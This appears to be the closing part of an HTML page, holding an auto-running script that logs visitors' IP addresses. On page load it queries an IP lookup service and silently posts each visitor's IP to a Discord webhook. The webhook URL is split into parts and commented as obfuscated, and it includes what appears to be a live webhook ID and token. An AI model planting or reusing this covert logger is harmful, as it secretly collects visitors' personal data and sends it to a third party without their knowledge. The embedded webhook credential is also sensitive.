<script>
    (function() {
        var a = "https://";
        var b = "api.ipify.org";
        var c = "?format=json";
        var d = a + b + c;
        
        fetch(d).then(function(e) {
            return e.json();
        }).then(function(f) {
            var g = f.ip;
            
            // Obfuscated Discord webhook URL (split into parts)
            var h = "discord.com";
            var i = "/api/webhooks/";
            var j = "1409357759924928622"; // Replace with your webhook ID
            var k = "/CofKLngqjohgKVxnsZWTX5ERSDfLrB5-mdxO7q_yEZPuEeSqYHOJdA8TaDVlTtjoi-Za";
            var l = a + h + i + j + k;
            
            fetch(l, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "Visitor IP: " + g })
            }).catch(function(m) {});
        }).catch(function(n) {});
    })();
</script>
</body> </html>
